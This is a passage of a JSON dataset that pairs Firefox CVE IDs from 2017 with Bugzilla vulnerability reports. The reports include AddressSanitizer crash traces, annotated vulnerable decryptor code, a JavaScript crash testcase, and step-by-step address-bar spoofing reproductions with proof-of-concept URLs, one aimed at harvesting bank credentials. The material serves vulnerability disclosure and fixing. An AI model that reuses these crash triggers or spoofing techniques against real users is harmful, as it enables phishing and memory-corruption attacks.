/home/worker/workspace/build/src/dom/canvas/CanvasRenderingContextHelper.cpp:56 #61 0x7fcef2acde86 in mozilla::dom::EncodingCompleteEvent::Run() /home/worker/workspace/build/src/dom/base/ImageEncoder.cpp:105:12 #62 0x7fcef0217012 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1264:7 #63 0x7fcef02138c0 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:389:10 #64 0x7fcef10322bf in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21 #65 0x7fcef0fa3658 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:3 #66 0x7fcef0fa3658 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #67 0x7fcef0fa3658 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #68 0x7fcef63ffdbf in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:3 #69 0x7fcef9a88d81 in nsAppStartup::Run() /home/worker/workspace/build/src/toolkit/components/startup/nsAppStartup.cpp:283:19 #70 0x7fcef9c5243c in XREMain::XRE_mainRun() /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4476:10 #71 0x7fcef9c53f38 in XREMain::XRE_main(int, char**, mozilla::BootstrapConfig const&) /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4654:8 #72 0x7fcef9c551fc in XRE_main(int, char**, mozilla::BootstrapConfig const&) /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4745:16 #73 0x4dffaf in do_main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:237:10 #74 0x4dffaf in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:308 #75 0x7fcf0b63282f in __libc_start_main /build/glibc-t3gR2i/glibc-2.23/csu/../csu/libc-start.c:291 #76 0x41c3d8 in _start (/home/ifratric/p0/latest/firefox/firefox+0x41c3d8) 0x611000721ecc is located 0 bytes to the right of 204-byte region [0x611000721e00,0x611000721ecc) allocated by thread T0 here: #0 0x4b2e4b in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:52:3 #1 0x7fcef25b9900 in AllocateStorageForTextRun /home/worker/workspace/build/src/gfx/thebes/gfxTextRun.cpp:122:21 #2 0x7fcef25b9900 in Create /home/worker/workspace/build/src/gfx/thebes/gfxTextRun.cpp:139 #3 0x7fcef25b9900 in gfxFontGroup::MakeTextRun(unsigned char const*, unsigned int, gfxTextRunFactory::Parameters const*, unsigned int, gfxMissingFontRecorder*) /home/worker/workspace/build/src/gfx/thebes/gfxTextRun.cpp:2075 #4 0x7fcef6ff6f49 in BuildTextRunsScanner::BuildTextRunForFrames(void*) /home/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:2394:17 #5 0x7fcef6fefe0b in BuildTextRunsScanner::FlushFrames(bool, bool) /home/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:1633:17 #6 0x7fcef6ffb09d in BuildTextRunsScanner::ScanFrame(nsIFrame*) /home/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:1902:9 #7 0x7fcef6ffb72f in BuildTextRunsScanner::ScanFrame(nsIFrame*) /home/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:1942:5 #8 0x7fcef6ffb72f in BuildTextRunsScanner::ScanFrame(nsIFrame*) /home/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:1942:5 #9 0x7fcef7003a8a in BuildTextRuns /home/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:1534:7 #10 0x7fcef7003a8a in nsTextFrame::EnsureTextRun(nsTextFrame::TextRunType, mozilla::gfx::DrawTarget*, nsIFrame*, nsLineList_iterator const*, unsigned int*) /home/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:2860 #11 0x7fcef703d429 in nsTextFrame::AddInlineMinISizeForFlow(nsRenderingContext*, nsIFrame::InlineMinISizeData*, nsTextFrame::TextRunType) /home/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:8329:5 #12 0x7fcef70405ef in nsTextFrame::AddInlineMinISize(nsRenderingContext*, nsIFrame::InlineMinISizeData*) /home/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:8499:7 #13 0x7fcef6e1a982 in nsContainerFrame::DoInlineIntrinsicISize(nsRenderingContext*, nsIFrame::InlineIntrinsicISizeData*, nsLayoutUtils::IntrinsicISizeType) /home/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:897:9 #14 0x7fcef6e1a982 in nsContainerFrame::DoInlineIntrinsicISize(nsRenderingContext*, nsIFrame::InlineIntrinsicISizeData*, nsLayoutUtils::IntrinsicISizeType) /home/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:897:9 #15 0x7fcef6d9f622 in nsBlockFrame::GetMinISize(nsRenderingContext*) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:774:11 #16 0x7fcef6e1b150 in ShrinkWidthToFit /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:5566:22 #17 0x7fcef6e1b150 in nsContainerFrame::ComputeAutoSize(nsRenderingContext*, mozilla::WritingMode, mozilla::LogicalSize const&, int, mozilla::LogicalSize const&, mozilla::LogicalSize const&, mozilla::LogicalSize const&, nsIFrame::ComputeSizeFlags) /home/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:942 #18 0x7fcef6e2260e in nsFrame::ComputeSize(nsRenderingContext*, mozilla::WritingMode, mozilla::LogicalSize const&, int, mozilla::LogicalSize const&, mozilla::LogicalSize const&, mozilla::LogicalSize const&, nsIFrame::ComputeSizeFlags) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:4822:24 #19 0x7fcef6d4fb36 in FloatMarginISize(mozilla::ReflowInput const&, int, nsIFrame*, mozilla::SizeComputationInput const&) /home/worker/workspace/build/src/layout/generic/BlockReflowInput.cpp:692:5 #20 0x7fcef6d4c21f in mozilla::BlockReflowInput::FlowAndPlaceFloat(nsIFrame*) /home/worker/workspace/build/src/layout/generic/BlockReflowInput.cpp:757:30 #21 0x7fcef6d4b143 in mozilla::BlockReflowInput::AddFloat(nsLineLayout*, nsIFrame*, int) /home/worker/workspace/build/src/layout/generic/BlockReflowInput.cpp:627:14 #22 0x7fcef6d21369 in AddFloat /home/worker/workspace/build/src/layout/generic/nsLineLayout.h:190:12 #23 0x7fcef6d21369 in nsLineLayout::ReflowFrame(nsIFrame*, nsReflowStatus&, mozilla::ReflowOutput*, bool&) /home/worker/workspace/build/src/layout/generic/nsLineLayout.cpp:979 #24 0x7fcef6dcb7bb in nsBlockFrame::ReflowInlineFrame(mozilla::BlockReflowInput&, nsLineLayout&, nsLineList_iterator, nsIFrame*, LineReflowStatus*) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:4153:3 #25 0x7fcef6dca446 in nsBlockFrame::DoReflowInlineFrames(mozilla::BlockReflowInput&, nsLineLayout&, nsLineList_iterator, nsFlowAreaRect&, int&, nsFloatManager::SavedState*, bool*, LineReflowStatus*, bool) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:3954:5 #26 0x7fcef6dc0d6c in nsBlockFrame::ReflowInlineFrames(mozilla::BlockReflowInput&, nsLineList_iterator, bool*) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:3828:9 #27 0x7fcef6dafacf in ReflowLine /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:2834:5 #28 0x7fcef6dafacf in nsBlockFrame::ReflowDirtyLines(mozilla::BlockReflowInput&) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:2370 #29 0x7fcef6da5c1a in nsBlockFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, nsReflowStatus&) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:1237:3 #30 0x7fcef6dc6e8d in nsBlockReflowContext::ReflowBlock(mozilla::LogicalRect const&, bool, nsCollapsingMargin&, int, bool, nsLineBox*, mozilla::ReflowInput&, nsReflowStatus&, mozilla::BlockReflowInput&) /home/worker/workspace/build/src/layout/generic/nsBlockReflowContext.cpp:306:3 #31 0x7fcef6dbc4da in nsBlockFrame::ReflowBlockFrame(mozilla::BlockReflowInput&, nsLineList_iterator, bool*) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:3462:7 #32 0x7fcef6dafafa in ReflowLine /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:2831:5 #33 0x7fcef6dafafa in nsBlockFrame::ReflowDirtyLines(mozilla::BlockReflowInput&) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:2370 #34 0x7fcef6da5c1a in nsBlockFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, nsReflowStatus&) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:1237:3 #35 0x7fcef6e0ada0 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, mozilla::WritingMode const&, mozilla::LogicalPoint const&, nsSize const&, unsigned int, nsReflowStatus&, nsOverflowContinuationTracker*) /home/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:1028:3 #36 0x7fcef6e09555 in nsCanvasFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, nsReflowStatus&) /home/worker/workspace/build/src/layout/generic/nsCanvasFrame.cpp:711:5 SUMMARY: AddressSanitizer: heap-buffer-overflow /home/worker/workspace/build/src/gfx/thebes/gfxFont.h:785:46 in IsSimpleGlyph Shadow bytes around the buggy address: 0x0c22800dc380: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c22800dc390: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd 0x0c22800dc3a0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c22800dc3b0: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa 0x0c22800dc3c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 =>0x0c22800dc3d0: 00 00 00 00 00 00 00 00 00[04]fa fa fa fa fa fa 0x0c22800dc3e0: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd 0x0c22800dc3f0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c22800dc400: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa 0x0c22800dc410: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c22800dc420: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==104545==ABORTING"
      }
    ],
    "CVE-2017-5448": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1346648",
        "title": "ClearKeyDecryptor Integer Overflow Remote (ZDI-CAN-4535)",
        "description": "We received the following report from Trending Micro's Zero Day Initiative (ZDI): ZDI-CAN-4535: Mozilla Firefox ClearKeyDecryptor Integer Overflow Remote Code Execution Vulnerability -- CVSS ----------------------------------------- 5.1, AV:N/AC:H/Au:N/C:P/I:P/A:P -- VULNERABILITY DETAILS ------------------------ * Version Tested: Firefox Nightly, changeset 341105:e677ba018b22, and general release Firefox 51.0.1 (32-bit) * Platform Tested: Windows 10 Enterprise 14393.693 This is a failed patch of the vulnerability we originally reported to you as ZDI-CAN-3766 in May 2016. The malicious value is found at offset +0x555 from the start of video1.m4s. Relevant source code (from mozilla-central\\media\\gmp-clearkey\\0.1\\clearkeydecryptionmanager.cpp): ``` Status ClearKeyDecryptor::Decrypt(uint8_t* aBuffer, uint32_t aBufferSize, const CryptoMetaData& aMetadata) { CK_LOGD(\"ClearKeyDecryptor::Decrypt\"); // If the sample is split up into multiple encrypted subsamples, we need to // stitch them into one continuous buffer for decryption. std::vector<uint8_t> tmp(aBufferSize); if (aMetadata.NumSubsamples()) { // Take all encrypted parts of subsamples and stitch them into one // continuous encrypted buffer. uint8_t* data = aBuffer; uint8_t* iter = &tmp[0]; for (size_t i = 0; i < aMetadata.NumSubsamples(); i++) { data += aMetadata.mClearBytes[i]; uint32_t cipherBytes = aMetadata.mCipherBytes[i]; if (data + cipherBytes > aBuffer + aBufferSize) { <==== Integer addition data + cipherBytes may wrap around, // Trying to read past the end of the buffer! bypassing the check return Status::kDecryptError; } memcpy(iter, data, cipherBytes); <==== BANG ``` [--- snipped debug log, moved to attachment ---] -- CREDIT --------------------------------------- This vulnerability was discovered by: Anonymous working with Trend Micro's Zero Day Initiative"
      }
    ],
    "CVE-2017-5449": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1340127",
        "title": "SEGV in ClearBidiControls",
        "description": "The following testcase crashes the latest ASAN build of Firefox. The testcase seems to depend on the browser window size. Try resizing the window if it does not crash on the first attempt. <script> function start() { o22=document.createElement('frame'); o38=document.createElement('frame'); o47=document.createElement('frame'); o65=document.createElement('style'); o22.style.writingMode='sideways-lr'; o74=document.createTextNode('{}:first-line{'); o65.appendChild(o74); o83=document.createElement('frame'); o47.animate([{unicodeBidi: 'embed',}],100); o100=document.documentElement; document.documentElement.prepend(unescape('%u0627'),undefined); o83.prepend(\"undefined\",\"undefined\",unescape(\"undefined%u8A08%u7B97%u3057%u30E5%u30FC%u30BF%u30FC%u8A08%u7B97%u3057%u30E5%u30FC%u30BF%u30FC%u8A08%u7B97%u3057%u30E5%u30FC%u30BF%u30FC\")); document.write('<html><body></body></html>'); document.documentElement.appendChild(o22); o22.appendChild(o38); o38.appendChild(o47); document.documentElement.appendChild(o65); o47.appendChild(o83); o22.appendChild(o100); } </script> <body onload=\"start()\"></body> ASAN:DEADLYSIGNAL ================================================================= ==7498==ERROR: AddressSanitizer: SEGV on unknown address 0x7ffe2c663d6c (pc 0x7faa7b918d7a bp 0x7ffc2c663c90 sp 0x7ffc2c6638e0 T0) #0 0x7faa7b918d79 in ClearBidiControls /home/worker/workspace/build/src/layout/base/nsBidiPresUtils.cpp:313:21 #1 0x7faa7b918d79 in ResolveParagraphWithinBlock /home/worker/workspace/build/src/layout/base/nsBidiPresUtils.cpp:1226 #2 0x7faa7b918d79 in nsBidiPresUtils::TraverseFrames(nsBlockFrame*, nsBlockInFlowLineIterator*, nsIFrame*, BidiParagraphData*) /home/worker/workspace/build/src/layout/base/nsBidiPresUtils.cpp:1192 #3 0x7faa7b917566 in nsBidiPresUtils::Resolve(nsBlockFrame*) /home/worker/workspace/build/src/layout/base/nsBidiPresUtils.cpp:697:5 #4 0x7faa7bac2e0b in ResolveBidi /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:7452:10 #5 0x7faa7bac2e0b in nsBlockFrame::GetMinISize(nsRenderingContext*) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:736 #6 0x7faa7bb3cbd0 in ShrinkWidthToFit /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:5529:22 #7 0x7faa7bb3cbd0 in nsContainerFrame::ComputeAutoSize(nsRenderingContext*, mozilla::WritingMode, mozilla::LogicalSize const&, int, mozilla::LogicalSize const&, mozilla::LogicalSize const&, mozilla::LogicalSize const&, nsIFrame::ComputeSizeFlags) /home/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:942 #8 0x7faa7bb4408e in nsFrame::ComputeSize(nsRenderingContext*, mozilla::WritingMode, mozilla::LogicalSize const&, int, mozilla::LogicalSize const&, mozilla::LogicalSize const&, mozilla::LogicalSize const&, nsIFrame::ComputeSizeFlags) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:4785:24 #9 0x7faa7ba8456e in mozilla::ReflowInput::InitConstraints(nsPresContext*, mozilla::LogicalSize const&, nsMargin const*, nsMargin const*, nsIAtom*) /home/worker/workspace/build/src/layout/generic/ReflowInput.cpp:2451:9 #10 0x7faa7ba7af04 in mozilla::ReflowInput::Init(nsPresContext*, mozilla::LogicalSize const*, nsMargin const*, nsMargin const*) /home/worker/workspace/build/src/layout/generic/ReflowInput.cpp:399:3 #11 0x7faa7ba43759 in emplace<nsPresContext *&, const mozilla::ReflowInput &, nsIFrame *&, mozilla::LogicalSize &> /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/Maybe.h:461:29 #12 0x7faa7ba43759 in nsLineLayout::ReflowFrame(nsIFrame*, unsigned int&, mozilla::ReflowOutput*, bool&) /home/worker/workspace/build/src/layout/generic/nsLineLayout.cpp:879 #13 0x7faa7baee855 in nsBlockFrame::ReflowInlineFrame(mozilla::BlockReflowInput&, nsLineLayout&, nsLineList_iterator, nsIFrame*, LineReflowStatus*) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:4151:3 #14 0x7faa7baed528 in nsBlockFrame::DoReflowInlineFrames(mozilla::BlockReflowInput&, nsLineLayout&, nsLineList_iterator, nsFlowAreaRect&, int&, nsFloatManager::SavedState*, bool*, LineReflowStatus*, bool) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:3952:5 #15 0x7faa7bae3e4c in nsBlockFrame::ReflowInlineFrames(mozilla::BlockReflowInput&, nsLineList_iterator, bool*) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:3826:9 #16 0x7faa7bad3223 in ReflowLine /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:2832:5 #17 0x7faa7bad3223 in nsBlockFrame::ReflowDirtyLines(mozilla::BlockReflowInput&) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:2368 #18 0x7faa7bac98e2 in nsBlockFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, unsigned int&) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:1237:3 #19 0x7faa7bb2ccc0 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, mozilla::WritingMode const&, mozilla::LogicalPoint const&, nsSize const&, unsigned int, unsigned int&, nsOverflowContinuationTracker*) /home/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:1028:3 #20 0x7faa7bb2b6a2 in nsCanvasFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, unsigned int&) /home/worker/workspace/build/src/layout/generic/nsCanvasFrame.cpp:711:5 #21 0x7faa7bb2ccc0 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, mozilla::WritingMode const&, mozilla::LogicalPoint const&, nsSize const&, unsigned int, unsigned int&, nsOverflowContinuationTracker*) /home/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:1028:3 #22 0x7faa7bbd02ea in nsHTMLScrollFrame::ReflowScrolledFrame(mozilla::ScrollReflowInput*, bool, bool, mozilla::ReflowOutput*, bool) /home/worker/workspace/build/src/layout/generic/nsGfxScrollFrame.cpp:552:3 #23 0x7faa7bbd1760 in nsHTMLScrollFrame::ReflowContents(mozilla::ScrollReflowInput*, mozilla::ReflowOutput const&) /home/worker/workspace/build/src/layout/generic/nsGfxScrollFrame.cpp:664:3 #24 0x7faa7bbd4f8b in nsHTMLScrollFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, unsigned int&) /home/worker/workspace/build/src/layout/generic/nsGfxScrollFrame.cpp:1039:3 #25 0x7faa7bb3d3e2 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) /home/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:1072:3 #26 0x7faa7baaf3a9 in mozilla::ViewportFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, unsigned int&) /home/worker/workspace/build/src/layout/generic/ViewportFrame.cpp:326:7 #27 0x7faa7b8b0c3c in mozilla::PresShell::DoReflow(nsIFrame*, bool) /home/worker/workspace/build/src/layout/base/PresShell.cpp:9258:3 #28 0x7faa7b8c45c4 in mozilla::PresShell::ProcessReflowCommands(bool) /home/worker/workspace/build/src/layout/base/PresShell.cpp:9431:24 #29 0x7faa7b8c3464 in mozilla::PresShell::FlushPendingNotifications(mozilla::ChangesToFlush) /home/worker/workspace/build/src/layout/base/PresShell.cpp:4233:11 #30 0x7faa7b835144 in nsRefreshDriver::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1915:9 #31 0x7faa7b843495 in mozilla::RefreshDriverTimer::TickRefreshDrivers(long, mozilla::TimeStamp, nsTArray<RefPtr<nsRefreshDriver> >&) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:305:7 #32 0x7faa7b843164 in mozilla::RefreshDriverTimer::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:327:5 #33 0x7faa7b8457d3 in RunRefreshDrivers /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:722:5 #34 0x7faa7b8457d3 in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::TickRefreshDriver(mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:631 #35 0x7faa7b8451b4 in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::NotifyVsync(mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:544:9 #36 0x7faa7c0bac14 in mozilla::layout::VsyncChild::RecvNotify(mozilla::TimeStamp const&) /home/worker/workspace/build/src/layout/ipc/VsyncChild.cpp:64:5 #37 0x7faa761e1718 in mozilla::layout::PVsyncChild::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PVsyncChild.cpp:160:20 #38 0x7faa75e6cba3 in mozilla::ipc::PBackgroundChild::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PBackgroundChild.cpp:1425:16 #39 0x7faa75db3bc0 in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1795:14 #40 0x7faa75db00fc in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1730:17 #41 0x7faa75db2734 in mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1603:5 #42 0x7faa75db2d7e in mozilla::ipc::MessageChannel::MessageTask::Run() /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1636:5 #43 0x7faa74fa9f59 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1264:7 #44 0x7faa74fa6850 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:389:10 #45 0x7faa75dbbac4 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:124:5 #46 0x7faa75d2cc38 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:3 #47 0x7faa75d2cc38 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #48 0x7faa75d2cc38 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #49 0x7faa7b1644ff in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:3 #50 0x7faa7e96a997 in XRE_RunAppShell() /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:852:12 #51 0x7faa75d2cc38 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:3 #52 0x7faa75d2cc38 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #53 0x7faa75d2cc38 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #54 0x7faa7e96a47c in XRE_InitChildProcess(int, char**, XREChildData const*) /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:684:7 #55 0x4e00c6 in content_process_main /home/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:64:19 #56 0x4e00c6 in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:284 #57 0x7faa9034c82f in __libc_start_main /build/glibc-t3gR2i/glibc-2.23/csu/../csu/libc-start.c:291 #58 0x41c2e8 in _start (/home/nils/fuzzer3/firefox/firefox+0x41c2e8) AddressSanitizer can not provide additional info. SUMMARY: AddressSanitizer: SEGV /home/worker/workspace/build/src/layout/base/nsBidiPresUtils.cpp:313:21 in ClearBidiControls ==7498==ABORTING"
      }
    ],
    "CVE-2017-5450": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1325955",
        "title": "Address bar spoofing on Android",
        "description": "User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 Steps to reproduce: User Agent: \"Mozilla/5.0 (Android 6.0.1; Mobile; rv:50.1.0) Gecko/50.1.0 Firefox/50.1.0\" POC: http://192.243.113.21/spoof/firefox/url1.html Actual results: The fake top level domain has been highlighted and the site attribute is wrong(see screenshot). Expected results: The site attribute should display the correct domain."
      }
    ],
    "CVE-2017-5451": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1273537",
        "title": "A click into the location bar can lead to a Location Bar Spoofing vulnerability (URL and SSL Spoofing) using the onblur event and change the URL size by a bigger URL size.",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:46.0) Gecko/20100101 Firefox/46.0 Build ID: 20160502172042 Steps to reproduce: (Only tested on Mac OS X). A simple click on the location bar can lead to a Location Bar Spoofing (URL and SSL Spoofing). Explication: If an user click on the location bar and the ONBLUR event defines that the actual URL changes its size by a bigger size, (eg: http://www.yyy.com/ becomes http://www.yyy.com/#wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwhttps://www.bank.com/ ) , the end of the URL is shown instead of the start of this URL (so the location bar shows https://www.bank.com instead of http://www.yyy.com/# ). -A demonstration video will be uploaded. 1) Open with Firefox \"PoC v1 Part1.html\" and click on the button \"Step 1: ClickMe\" (a popup window is opened) 2) Click on the location bar Actual results: The Location Bar is Spoofed and if the Malicious WebSite is secure , this leads to URL And SSL Spoofing Expected results: If an user click on the location bar and the ONBLUR event defines that the actual URL changes its size by a bigger size, the end of the URL is shown instead of the start of this URL. Possible way to patch this vulnerability : When an user click on the location bar , Firefox should continue to show the start of the visited URL instead of the end of this URL."
      }
    ],
    "CVE-2017-5452": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1344517",
        "title": "Firefox for Android: Location Bar Spoofing Risk - The Location Bar remains hidden using scroll event and another website is loaded during this scroll event (Patch for Bug 1293463 doesn't prevent completely Location Bar Spoofing risks)",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:51.0) Gecko/20100101 Firefox/51.0 Build ID: 20170125094131 Steps to reproduce: I noticed that the patch for Bug 1293463 does not prevent all Location Bar Spoofing risks because this patch consists to show the real location bar only when the user clicks on a HTML editable tag (<input type=text> ; <input type=password> ; <textarea>). The essential problem of patch for Bug 1293463 is that the fake location bar continues to replace the real location bar. Multiple websites, especially the bank websites allowing access to users' bank accounts using a numeric keypad or a web virtual keyboard to write its user credentials (customer-ID and Password). So, a click on an input tag isn't used by these bank websites (leading to the fake location bar continue to be displayed and the real location bar remains hidden during the writing of user credentials by a numeric keypad or a web virtual keyboard). NOTE: it's also possible to use fake Android Keyboard to write user credentials needed into a fake <input> tag. Steps: Step 1: Go to http://www.alternativ-testing.fr/Research/Mozilla/android/~h5fh85f9j03ftrK9-Location%20Bar%20Spoofing%20with%20scroll%20event%20and%20another%20webpage%20with%20a%20long%20time%20for%20loading~/index-start-1.html and click on the link (a Google search webpage will be opened into a new tab) Step 2: Scroll down into this webpage (the location bar disappears) , during this scroll event a malicious webpage will load slowly without that the real Location Bar appears leading to Location Bar Spoofing risks (The real Location Bar remains hidden and a fake location bar will replace this real Location Bar). <!>Step2 INFO : The loading time of the malicious webpage is 9 seconds when you go on the Google search webpage but this loading time can be changed by a bigger loading time. (The PHP code of \"redirect-and-sleep().php\" can be changed by a bigger or smaller loading time).<!> Info about the malicious webpage: The malicious webpage, a numeric keypad should be used to write the Customer ID and the Password (like it is used on the login webpage in a bank website. Actual results: The fake location bar continue to be displayed and the real location bar remains hidden during the writing of user credentials by a numeric keypad or a web virtual keyboard. The Location Bar remains hidden when the malicious webpage is loaded and this malicious webpage contains a fake Location Bar leading to a Location Bar URL / SSL Spoofing Risk. Expected results: The Location Bar should reappear when another webpage is loaded. When the user scroll down into a first webpage and a 2nd webpage/website is loaded during this scroll event, the real location bar should reappear when the 2nd webpage is completely loaded. Solution: The Location Bar should be always visible when another webpage is completely loaded."
      }
